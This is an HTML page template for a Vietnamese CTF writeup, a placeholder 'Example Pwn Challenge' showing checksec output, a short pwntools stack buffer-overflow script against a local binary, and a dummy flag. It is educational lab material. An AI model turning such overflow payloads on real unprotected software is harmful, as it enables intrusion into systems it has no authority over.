@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Writeup | Example Pwn Challenge</title>
+  <style>
+    :root{
+      --bg: #05070a;
+      --panel: rgba(255,255,255,0.03);
+      --text: #f0f2f5;
+      --muted: #94a3b8;
+      --line: rgba(255,255,255,0.08);
+      --brand2: #06b6d4;
+      --max: 800px;
+      --mono: "JetBrains Mono", monospace;
+      --sans: "Inter", system-ui, sans-serif;
+    }
+    [data-theme="light"] {
+      --bg: #f8fafc;
+      --panel: #ffffff;
+      --text: #0f172a;
+      --muted: #475569;
+      --line: #e2e8f0;
+    }
+    body {
+      margin: 0;
+      font-family: var(--sans);
+      color: var(--text);
+      background: var(--bg);
+      line-height: 1.7;
+    }
+    .wrap { max-width: var(--max); margin: 0 auto; padding: 60px 20px; }
+    .back { color: var(--brand2); text-decoration: none; font-weight: 600; display: inline-flex; align-items: center; gap: 8px; margin-bottom: 30px; }
+    h1 { font-size: 2.5rem; margin: 0 0 10px; letter-spacing: -1px; }
+    .meta { color: var(--muted); font-family: var(--mono); font-size: 0.9rem; margin-bottom: 40px; display: flex; gap: 15px; }
+    
+    h2 { margin-top: 40px; color: var(--brand2); }
+    pre {
+      background: #000;
+      color: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      overflow-x: auto;
+      font-family: var(--mono);
+      font-size: 0.9rem;
+      border: 1px solid var(--line);
+    }
+    code { font-family: var(--mono); background: var(--panel); padding: 2px 6px; border-radius: 4px; }
+    
+    .content img { max-width: 100%; border-radius: 12px; margin: 20px 0; border: 1px solid var(--line); }
+    
+    footer { margin-top: 80px; padding-top: 20px; border-top: 1px solid var(--line); color: var(--muted); text-align: center; }
+  </style>
+</head>
+<body>
+  <main class="wrap">
+    <a href="../writeups.html" class="back">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+      Tất cả writeups
+    </a>
+
+    <article class="content">
+      <header>
+        <h1>Example Pwn Challenge</h1>
+        <div class="meta">
+          <span>📅 Jan 14, 2026</span>
+          <span>🏷️ Pwn, Buffer Overflow</span>
+        </div>
+      </header>
+
+      <p>Đây là một bài mô tả ngắn về thử thách Pwn. Bạn có thể thay đổi nội dung này bằng writeup thực tế của mình.</p>
+
+      <h2>1. Phân tích (Analysis)</h2>
+      <p>Sử dụng <code>checksec</code> để kiểm tra các cơ chế bảo mật của file binary:</p>
+      <pre>
+[*] '/path/to/binary'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</pre>
+
+      <h2>2. Khai thác (Exploitation)</h2>
+      <p>Vì bài toán không có stack canary, chúng ta có thể thực hiện tấn công Buffer Overflow cơ bản.</p>
+      <pre>
+from pwn import *
+
+io = process('./binary')
+payload = b'A' * 40 + p64(0xdeadbeef)
+
+io.sendline(payload)
+io.interactive()</pre>
+
+      <h2>3. Kết luận</h2>
+      <p>Flag: <code>CTF{pwn_is_fun_123}</code></p>
+    </article>
+
+    <footer>
+      © <span id="year"></span> Shiinn
+    </footer>
+  </main>
+
+  <script>
+    document.getElementById("year").textContent = new Date().getFullYear();
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) document.documentElement.setAttribute("data-theme", currentTheme);
+  </script>
+</body>
+</html>
